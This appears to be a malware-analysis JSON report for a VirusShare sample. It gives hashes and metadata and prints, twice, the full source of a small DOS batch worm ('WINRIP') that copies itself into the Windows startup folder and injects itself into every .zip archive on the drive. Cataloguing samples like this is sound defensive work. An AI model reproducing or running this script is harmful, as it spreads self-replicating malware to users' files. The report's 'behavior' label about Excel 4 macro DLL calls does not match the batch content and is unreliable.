@@ -1,0 +1,40 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "call": "May call a DLL using Excel 4 Macros"
+        },
+        "macro": "@echo off\n@echo REM WINRIP by SkamWerks Labs > winripem.bat\n@copy winrip.bat \"c:\\..\\..\\..\\..\\..\\..\\..\\winnt\\profiles\\default user\\start menu\\programs\\startup\\winrip.bat\"\n@dir /s /b /l c:\\winzip32.exe | set wz=\n@FOR /F \"delims==\" %%y IN ('dir /s /b /l c:\\*.zip') DO @echo \"%wz%\" -min -a -r -p \"%%y\" \"c:\\..\\..\\..\\..\\..\\..\\..\\winnt\\profiles\\default user\\start menu\\programs\\startup\\winrip.bat\" >> winripem.bat\n@call winripem.bat\n@del winripem.bat"
+    },
+    "filename": "VirusShare_c608558de24266f16985a2f4db442e14",
+    "filesize": 444,
+    "filetype": "DOS batch file, ASCII text",
+    "hashes": {
+        "md5": "c608558de24266f16985a2f4db442e14",
+        "sha1": "565c55d7f58800e554cacbdfd78004462d065f66",
+        "sha256": "05903da49e6ae46f60d09505fb9779cb1850ddf67d2cdc514b7350a557018fb8"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            "@echo REM WINRIP by SkamWerks Labs > winripem.bat",
+            "@copy winrip.bat \"c:\\..\\..\\..\\..\\..\\..\\..\\winnt\\profiles\\default user\\start menu\\programs\\startup\\winrip.bat\"",
+            "@dir /s /b /l c:\\winzip32.exe | set wz=",
+            "@FOR /F \"delims==\" %%y IN ('dir /s /b /l c:\\*.zip') DO @echo \"%wz%\" -min -a -r -p \"%%y\" \"c:\\..\\..\\..\\..\\..\\..\\..\\winnt\\profiles\\default user\\start menu\\programs\\startup\\winrip.bat\" >> winripem.bat",
+            "@call winripem.bat",
+            "@del winripem.bat"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.270618",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
